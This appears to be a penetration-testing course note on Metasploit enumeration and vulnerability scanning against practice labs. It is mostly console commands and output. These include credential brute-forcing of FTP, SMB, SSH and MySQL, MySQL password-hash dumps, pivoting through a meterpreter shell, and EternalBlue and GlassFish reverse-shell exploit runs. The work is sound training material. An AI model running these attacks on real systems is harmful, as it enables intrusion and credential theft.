# Information Gathering & Enumeration

## Nmap Enumeration <a href="#nmap-enumeration" id="nmap-enumeration"></a>

**`nmap`** enumeration results (_service versions, operating systems, etc_) can be exported into a file that can be imported into MSF and used for further detection and exploitation.

> 🔬 Check the full `nmap` information gathering lab in [this Nmap Host Discovery Lab](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/1-info-gathering#lab-with-nmap) (at the end of the page).

Some commands:nmap \<TARGET\_IP>nmap -Pn \<TARGET\_IP>nmap -Pn -sV -O \<TARGET\_IP>

* Output the `nmap` scan results into an **`.XML`** format file that can be imported into MSF

nmap -Pn -sV -O 10.2.18.161 -oX windows\_server\_2012

### ​[MSFdb Import](https://www.offsec.com/metasploit-unleashed/using-databases/)​ <a href="#msfdb-import" id="msfdb-import"></a>

* In the same lab environment from above, use `msfconsole` to import the results into MSF with the `db_import` command

service postgresql startmsfconsole

* Inside `msfconsole`

db\_statusworkspace -a Win2k12db\_import /root/windows\_server\_2012\[\*] Importing 'Nmap XML' data\[\*] Import: Parsing with 'Nokogiri v1.10.7'\[\*] Importing host 10.2.18.161\[\*] Successfully imported /root/windows\_server\_2012hostsservicesvulnslootcredsnotes![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ba67b9abca052938ff18e17b7f35afdab9badf6f%2Fimage-20230412190333138.png?alt=media)

* Perform an `nmap` scan _within the MSF Console and import the results in a dedicated workspace_

workspace -a nmap\_MSFdb\_nmap -Pn -sV -O \<TARGET\_IP>![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-90d3514d0aea7cc72d1451e9439952f4b724e2d5%2Fimage-20230412190726940.png?alt=media)

#### ​[Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)​ <a href="#port-scanning" id="port-scanning"></a>

MSF **Auxiliary modules** are used during the information gathering (similar to `nmap`) and the post exploitation phases of the pentest.

* perform TCP/UDP port scanning
* enumerate services
* discover hosts on different network subnets (post-exploitation phase)

**Lab Network Service Scanning**

> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)​

service postgresql start && msfconsole -qworkspace -a Port\_scansearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.41.167.3run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f9bb00e236dcbcacb2dd85e5f4f8181ca1810f97%2Fimage-20230412220747788.png?alt=media)curl 192.41.167.3

* Exploitation

search xodause exploit/unix/webapp/xoda\_file\_uploadset RHOSTS 192.41.167.3set TARGETURI /run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-be8eaadffd478211a6c3c787bbd54c2ffb0dd4e4%2Fimage-20230412221111369.png?alt=media)

* Perform a network scan on the second target

meterpreter > shell/bin/bash -iifconfig# 192.26.158.2 Local Lan subnet IPexit

* Add the route within `meterpreter` and background the meterpreter session

run autoroute -s 192.26.158.2background![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-67e7adb134ca47fb1df4ff6f49abb7370d8802a9%2Fimage-20230412221528898.png?alt=media)search portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.26.158.3run# the port scan will be performed through the first target system using the route\[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN

* Upload and run `nmap` against the second target, from the first target machine

sessions 1upload /root/tools/static-binaries/nmap /tmp/nmapshell/bin/bash -icd /tmpchmod +x ./nmap./nmap -p- 192.26.158.321/tcp open ftp22/tcp open ssh80/tcp open http

> 📌 There are **`3`** running services on the second target machine.

**UDP Scan**

* Into `msfconsole`

search udp\_sweepuse auxiliary/scanner/discovery/udp\_sweepset RHOSTS 192.41.167.3run

#### ​[Services Enumeration](https://www.offsec.com/metasploit-unleashed/service-identification/)​ <a href="#services-enumeration" id="services-enumeration"></a>

> 📌🔬 Check the [Enumeration Section labs here](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration) for basic `nmap` enumeration.

Next, there are some MSF commands and modules for **service enumeration** on the same labs from the Enumeration Section.

* Auxiliary modules can be used for enumeration, brute-force attacks, etc

❗📝 **On every attacker machine, run this command to start `msfconsole`:**service postgresql start && msfconsole -q

* Setup a **global variable**. This will set the RHOSTS option for all the modules utilized:

setg RHOSTS \<TARGET\_IP>

**​**[**FTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ftp-enum)**​**

> **`auxiliary/scanner/ftp/ftp_version`**

ip -br -c aworkspace -a FTP\_ENUMsearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.146.175.3run\[+] 192.146.175.3: - 192.146.175.3:21 - TCP OPENbacksearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/ftp\_versionset RHOSTS 192.146.175.3run\[+] 192.146.175.3:21 - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) \[::ffff:192.146.175.3]\x0d\x0a'​search ProFTPD

> **`auxiliary/scanner/ftp/ftp_login`**

backsearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/ftp\_loginshow optionsset RHOSTS 192.146.175.3set USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtrun\[+] 192.146.175.3:21 - 192.146.175.3:21 - Login Successful: sysadmin:654321

> **`auxiliary/scanner/ftp/anonymous`**

backsearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/anonymousset RHOSTS 192.146.175.3run

**​**[**SMB/SAMBA**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/smb-enum#lab-3)**​**

> **`auxiliary/scanner/smb/smb_version`**

ip -br -c asetg RHOSTS 192.132.155.3workspace -a SMB\_ENUMsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_versionoptionsrun\[\*] 192.132.155.3:445 - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)

> **`auxiliary/scanner/smb/smb_enumusers`**

backsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_enumusersinforun\[+] 192.132.155.3:139 - SAMBA-RECON \[ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )

> **`auxiliary/scanner/smb/smb_enumshares`**

backsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_enumsharesset ShowFiles truerun\[+] 192.132.155.3:139 - public - (DS)\[+] 192.132.155.3:139 - john - (DS)\[+] 192.132.155.3:139 - aisha - (DS)\[+] 192.132.155.3:139 - emma - (DS)\[+] 192.132.155.3:139 - everyone - (DS)\[+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)

> ​[**`auxiliary/scanner/smb/smb_login`**](https://www.offsec.com/metasploit-unleashed/smb-login-check/)​

backsearch smb\_loginuse auxiliary/scanner/smb/smb\_loginoptionsset SMBUser adminset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtrun\[+] 192.132.155.3:445 - 192.132.155.3:445 - Success: '.\admin:password'

**​**[**HTTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/http-enum#lab-3)**​**

> 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)​

* Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.

ip -br -c asetg RHOSTS 192.106.226.3setg RHOST 192.106.226.3workspace -a HTTP\_ENUM

> **`auxiliary/scanner/http/apache_userdir_enum`**

search apache\_userdir\_enumuse auxiliary/scanner/http/apache\_userdir\_enumoptionsinfoset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtrun\[+] http://192.106.226.3/ - Users found: rooty

> **`auxiliary/scanner/http/brute_dirs`**

> **`auxiliary/scanner/http/dir_scanner`**

search dir\_scanneruse auxiliary/scanner/http/dir\_scanneroptionsrun

> **`auxiliary/scanner/http/dir_listing`**

> **`auxiliary/scanner/http/http_put`**

\[+] Found http://192.106.226.3:80/cgi-bin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/data/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/doc/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/downloads/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/icons/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/manual/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/secure/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/users/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/uploads/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/web\_app/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/view/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webadmin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webmail/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webdb/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webdav/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/\~admin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/\~nobody/ 404 (192.106.226.3)

> **`auxiliary/scanner/http/files_dir`**

search files\_diruse auxiliary/scanner/http/files\_diroptionsset DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap\_files.txtrun\[+] Found http://192.106.226.3:80/file.backup 200\[\*] Using code '404' as not found for files with extension .bak\[\*] Using code '404' as not found for files with extension .c\[+] Found http://192.106.226.3:80/code.c 200\[\*] Using code '404' as not found for files with extension .cfg\[+] Found http://192.106.226.3:80/code.cfg 200\[\*] Using code '404' as not found for files with extension .class\[...]\[\*] Using code '404' as not found for files with extension .html\[+] Found http://192.106.226.3:80/index.html 200\[\*] Using code '404' as not found for files with extension .htm\[...]\[+] Found http://192.106.226.3:80/test.php 200\[\*] Using code '404' as not found for files with extension .tar\[...]

> **`auxiliary/scanner/http/http_login`**

search http\_loginuse auxiliary/scanner/http/http\_loginoptionsset AUTH\_URI /secure/unset USERPASS\_FILEecho "rooty" > user.txtset USER\_FILE /root/user.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtset VERBOSE falserun

> **`auxiliary/scanner/http/http_header`**

search http\_headeruse auxiliary/scanner/http/http\_headeroptionsrun\[+] 192.106.226.3:80 : CONTENT-TYPE: text/html\[+] 192.106.226.3:80 : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT\[+] 192.106.226.3:80 : SERVER: Apache/2.4.18 (Ubuntu)\[+] 192.106.226.3:80 : detected 3 headers

> **`auxiliary/scanner/http/http_version`**

search type:auxiliary name:httpuse auxiliary/scanner/http/http\_versionoptionsrun# in case of HTTPS website, set RPORT=443 and SSL="true"\[+] 192.106.226.3:80 Apache/2.4.18 (Ubuntu)

> **`auxiliary/scanner/http/robots_txt`**

search robots\_txtuse auxiliary/scanner/http/robots\_txtoptionsrun\[+] Contents of Robots.txt:# robots.txt for attackdefenseUser-agent: test# DirectoriesAllow: /webmailUser-agent: \*# DirectoriesDisallow: /dataDisallow: /securecurl http://192.106.226.3/data/curl http://192.106.226.3/secure/

**​**[**MYSQL**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/mysql-enum)**​**

> 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)​

ip -br -c asetg RHOSTS 192.64.22.3setg RHOST 192.64.22.3workspace -a MYSQL\_ENUM

> **`auxiliary/admin/mysql/mysql_enum`**

search mysql\_enumuse auxiliary/admin/mysql/mysql\_enuminfoset USERNAME rootset PASSWORD twinklerun\[\*] 192.64.22.3:3306 - Running MySQL Enumerator...\[\*] 192.64.22.3:3306 - Enumerating Parameters\[\*] 192.64.22.3:3306 - MySQL Version: 5.5.61-0ubuntu0.14.04.1\[\*] 192.64.22.3:3306 - Compiled for the following OS: debian-linux-gnu\[\*] 192.64.22.3:3306 - Architecture: x86\_64\[\*] 192.64.22.3:3306 - Server Hostname: victim-1\[\*] 192.64.22.3:3306 - Data Directory: /var/lib/mysql/\[\*] 192.64.22.3:3306 - Logging of queries and logins: OFF\[\*] 192.64.22.3:3306 - Old Password Hashing Algorithm OFF\[\*] 192.64.22.3:3306 - Loading of local files: ON\[\*] 192.64.22.3:3306 - Deny logins with old Pre-4.1 Passwords: OFF\[\*] 192.64.22.3:3306 - Allow Use of symlinks for Database Files: YES\[\*] 192.64.22.3:3306 - Allow Table Merge:\[\*] 192.64.22.3:3306 - SSL Connection: DISABLED\[\*] 192.64.22.3:3306 - Enumerating Accounts:\[\*] 192.64.22.3:3306 - List of Accounts with Password Hashes:\[+] 192.64.22.3:3306 - User: root Host: localhost Password Hash: \*A0E23B565BACCE3E70D223915ABF2554B2540144\[+] 192.64.22.3:3306 - User: root Host: 891b50fafb0f Password Hash:\[+] 192.64.22.3:3306 - User: root Host: 127.0.0.1 Password Hash:\[+] 192.64.22.3:3306 - User: root Host: ::1 Password Hash:\[+] 192.64.22.3:3306 - User: debian-sys-maint Host: localhost Password Hash: \*F4E71A0BE028B3688230B992EEAC70BC598FA723\[+] 192.64.22.3:3306 - User: root Host: % Password Hash: \*A0E23B565BACCE3E70D223915ABF2554B2540144\[+] 192.64.22.3:3306 - User: filetest Host: % Password Hash: \*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B\[+] 192.64.22.3:3306 - User: ultra Host: localhost Password Hash: \*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29\[+] 192.64.22.3:3306 - User: guest Host: localhost Password Hash: \*17FD2DDCC01E0E66405FB1BA16F033188D18F646\[+] 192.64.22.3:3306 - User: gopher Host: localhost Password Hash: \*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0\[+] 192.64.22.3:3306 - User: backup Host: localhost Password Hash: \*E6DEAD2645D88071D28F004A209691AC60A72AC9\[+] 192.64.22.3:3306 - User: sysadmin Host: localhost Password Hash: \*78A1258090DAA81738418E11B73EB494596DFDD3\[\*] 192.64.22.3:3306 - The following users have GRANT Privilege:\[...]

> **`auxiliary/admin/mysql/mysql_sql`**

search mysql\_sqluse auxiliary/admin/mysql/mysql\_sqloptionsset USERNAME rootset PASSWORD twinklerun# set an SQL queryset SQL show databases;run\[\*] 192.64.22.3:3306 - Sending statement: 'select version()'...\[\*] 192.64.22.3:3306 - | 5.5.61-0ubuntu0.14.04.1 |​\[\*] 192.64.22.3:3306 - Sending statement: 'show databases;'...\[\*] 192.64.22.3:3306 - | information\_schema |\[\*] 192.64.22.3:3306 - | mysql |\[\*] 192.64.22.3:3306 - | performance\_schema |\[\*] 192.64.22.3:3306 - | upload |\[\*] 192.64.22.3:3306 - | vendors |\[\*] 192.64.22.3:3306 - | videos |\[\*] 192.64.22.3:3306 - | warehouse |

> **`auxiliary/scanner/mysql/mysql_file_enum`**

> **`auxiliary/scanner/mysql/mysql_hashdump`**

> **`auxiliary/scanner/mysql/mysql_login`**

search mysql\_loginuse auxiliary/scanner/mysql/mysql\_loginoptionsset USERNAME rootset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtset VERBOSE falseset STOP\_ON\_SUCCESS falserun\[+] 192.64.22.3:3306 - 192.64.22.3:3306 - Success: 'root:twinkle'

> **`auxiliary/scanner/mysql/mysql_schemadump`**

search mysql\_schemadumpuse auxiliary/scanner/mysql/mysql\_schemadumpoptionsset USERNAME rootset PASSWORD twinklerun\[+] 192.64.22.3:3306 - Schema stored in:/root/.msf4/loot/20230413112948\_MYSQL\_ENUM\_192.64.22.3\_mysql\_schema\_807923.txt\[+] 192.64.22.3:3306 - MySQL Server SchemaHost: 192.64.22.3Port: 3306====================---- DBName: uploadTables: \[]- DBName: vendorsTables: \[]- DBName: videosTables: \[]- DBName: warehouseTables: \[]

> **`auxiliary/scanner/mysql/mysql_version`**

search type:auxiliary name:mysqluse auxiliary/scanner/mysql/mysql\_versionoptionsrun\[+] 192.64.22.3:3306 - 192.64.22.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)# MySQL and Ubuntu versions enumerated!

> **`auxiliary/scanner/mysql/mysql_writable_dirs`**

* Check the MySQL Enumerated data within MSF:

hostsserviceslootcreds![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e00dc1815b532662bee3be7fd6657f8eccd1abd4%2Fimage-20230413133324466.png?alt=media)

**​**[**SSH**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ssh-enum)**​**

> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)​

ip -br -c asetg RHOSTS 192.127.196.3setg RHOST 192.127.196.3workspace -a SSH\_ENUM

> **`auxiliary/scanner/ssh/ssh_version`**

search type:auxiliary name:sshuse auxiliary/scanner/ssh/ssh\_versionoptionsrun\[+] 192.127.196.3:22 - SSH server version: SSH-2.0-OpenSSH\_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu\_linux:19.04 service.protocol=ssh fingerprint\_db=ssh.banner )# SSH-2.0-OpenSSH\_7.9p1 and Ubuntu 19.04

> **`auxiliary/scanner/ssh/ssh_login`**

search ssh\_loginuse auxiliary/scanner/ssh/ssh\_login# for password authenticationoptionsset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/common\_passwords.txtrun\[+] 192.127.196.3:22 - Success: 'sysadmin:hailey' ''\[\*] Command shell session 1 opened (192.127.196.2:37093 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'rooty:pineapple' ''\[\*] Command shell session 2 opened (192.127.196.2:44935 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'demo:butterfly1' ''\[\*] Command shell session 3 opened (192.127.196.2:39681 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'auditor:xbox360' ''\[\*] Command shell session 4 opened (192.127.196.2:42273 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'anon:741852963' ''\[\*] Command shell session 5 opened (192.127.196.2:44263 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'administrator:password1' ''\[\*] Command shell session 6 opened (192.127.196.2:39997 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'diag:secret' ''

* This module sets up SSH sessions

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-7e5cd4807505d1993711dd2568be44f6427b7d0d%2Fimage-20230413143027661.png?alt=media)

> **`auxiliary/scanner/ssh/ssh_enumusers`**

search type:auxiliary name:sshuse auxiliary/scanner/ssh/ssh\_enumusersoptionsset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtrun\[+] 192.127.196.3:22 - SSH - User 'sysadmin' found\[+] 192.127.196.3:22 - SSH - User 'rooty' found\[+] 192.127.196.3:22 - SSH - User 'demo' found\[+] 192.127.196.3:22 - SSH - User 'auditor' found\[+] 192.127.196.3:22 - SSH - User 'anon' found\[+] 192.127.196.3:22 - SSH - User 'administrator' found\[+] 192.127.196.3:22 - SSH - User 'diag' found

**​**[**SMTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/smtp-enum)**​**

> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)​

ip -br -c asetg RHOSTS 192.8.115.3setg RHOST 192.8.115.3workspace -a SMTP\_ENUM# Run a portscan to identify SMTP port, in this case is port 25

> **`auxiliary/scanner/smtp/smtp_enum`**

search type:auxiliary name:smtpuse auxiliary/scanner/smtp/smtp\_enumoptionsrun\[+] 192.63.243.3:25 - 192.63.243.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data

> **`auxiliary/scanner/smtp/smtp_version`**

search type:auxiliary name:smtpuse auxiliary/scanner/smtp/smtp\_versionoptionsrun\[+] 192.8.115.3:25 - 192.8.115.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a

### Vulnerability Scanning With MSF <a href="#vulnerability-scanning-with-msf" id="vulnerability-scanning-with-msf"></a>

MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.

* Useful in the **Exploitation** phase of the pentest

🔬 [Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.

* **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.

> 🔬 You can find my lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), _set up for educational purposes_.

* Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.

Detect active hosts on the local network, from the Kali VM:sudo nmap -sn 192.168.31.0/24Nmap scan report for 192.168.31.139 # Linux targetNmap scan report for 192.168.31.140 # Windows2008 target

* Run Metasploit:

service postgresql start && msfconsole -qdb\_statussetg RHOSTS 192.168.31.140setg RHOST 192.168.31.140workspace -a VULN\_SCAN\_MS3

* **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF

db\_nmap -sS -sV -O 192.168.31.140\[\*] Nmap: 21/tcp open ftp Microsoft ftpd\[\*] Nmap: 22/tcp open ssh OpenSSH 7.1 (protocol 2.0)\[\*] Nmap: 80/tcp open http Microsoft IIS httpd 7.5\[\*] Nmap: 135/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 139/tcp open netbios-ssn Microsoft Windows netbios-ssn\[\*] Nmap: 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\[\*] Nmap: 3306/tcp open mysql MySQL 5.5.20-log\[\*] Nmap: 3389/tcp open tcpwrapped\[\*] Nmap: 4848/tcp open ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 7676/tcp open java-message-service Java Message Service 301\[\*] Nmap: 8009/tcp open ajp13 Apache Jserv (Protocol v1.3)\[\*] Nmap: 8080/tcp open http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 8181/tcp open ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 8383/tcp open http Apache httpd\[\*] Nmap: 9200/tcp open wap-wsp?\[\*] Nmap: 49152/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49153/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49154/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49155/tcp open msrpc Microsoft Windows RPC\[...]![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-da30e0d4036528a13a9f80ff9d8b01fdd950c4eb%2Fimage-20230413200524969.png?alt=media)db\_nmaphostsservices

* Manually search for a specific exploit
  * Check if there are any exploits for a particular **version** of a service

search type:exploit name:iis![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-375c51ac9321889fd7f66157154bed2363465c80%2Fimage-20230413192845621.png?alt=media)search type:exploit name:iissearch Sun GlassFish

* Check if a module will work on the specific version of the service

use exploit/multi/http/glassfish\_deployerinfo​# Description:# This module logs in to a GlassFish Server (Open Source or# Commercial) using various methods (such as authentication bypass,# default credentials, or user-supplied login), and deploys a# malicious war file in order to get remote code execution. It has# been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System# Application Server 9.x. Newer GlassFish versions do not allow remote# access (Secure Admin) by default, but is required for exploitation.set payload windows/meterpreter/reverse\_tcpoptions# check the LHOST, LPORT, APP\_RPORT, RPORT, PAYLOAD options

* Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules

searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ccd61dd756b19c9fe6732fd4bc6df233f08f8c9a%2Fimage-20230413194606641.png?alt=media)

* Back in `msfconsole`, check if the server is vulnerable to MS17-010

search eternalblueuse auxiliary/scanner/smb/smb\_ms17\_010run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e9399a0e6c8efc589338f07390d7ad79f5433cf8%2Fimage-20230413200558380.png?alt=media)use exploit/windows/smb/ms17\_010\_eternalblueoptions# always check Payload optionsrun

> ​[**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
>
> * _takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services_

* On a Kali terminal

wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db\_autopwn.rbsudo mv db\_autopwn.rb /usr/share/metasploit-framework/plugins/

* On `msfconsole`

load db\_autopwndb\_autopwn -p -t# Enumerates exploits for each of the open portsdb\_autopwn -p -t -PI 445# Limit to only the 445 port![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-aebfca43b742e41d758e63a2e3e6b0cdbc355643%2Fimage-20230413202435550.png?alt=media)db\_autopwn -p -t -PI 445

* On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services)

analyze![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f2413c550b79a3a1148a63bdb63d63dc5778b675%2Fimage-20230413202708057.png?alt=media)analyzevulns![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ceda763cca80af814cb9304c543bd68cb4bb61f3%2Fimage-20230413202802181.png?alt=media)vulns

#### VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/)​ <a href="#va-with-nessus" id="va-with-nessus"></a>

> 🔬 You can find my [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems/linux/tools/nessus).

* A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
* Nessus Essentials free version allows to scan up to 16 IPs.

Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.Wait for the scan conclusion and export the results with the **Export/Nessus** button.![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-986ff2afeccc2978f8dfefa575f9bdf4d236d58d%2Fimage-20230413222104319.png?alt=media)Nessus Essentials - Metasploitable3

* Open the `msfconsole` terminal and import the Nessus results
  * Check the information from the scan results with the `hosts`, `services`, `vulns` commands

workspace -a MS3\_NESSUSdb\_import /home/kali/Downloads/MS3\_zph3t5.nessushostsservicesvulns![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-1562ae2abdb68d12d5245bf395d9dd026ad7295c%2Fimage-20230413222333897.png?alt=media)vulns -p 445![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-22fa84721de13f146690e31e9bde9df8926340e6%2Fimage-20230413222411974.png?alt=media)search cve:2017 name:smbsearch MS12-020search cve:2019 name:rdpsearch cve:2015 name:ManageEnginesearch PHP CGI Argument Injection
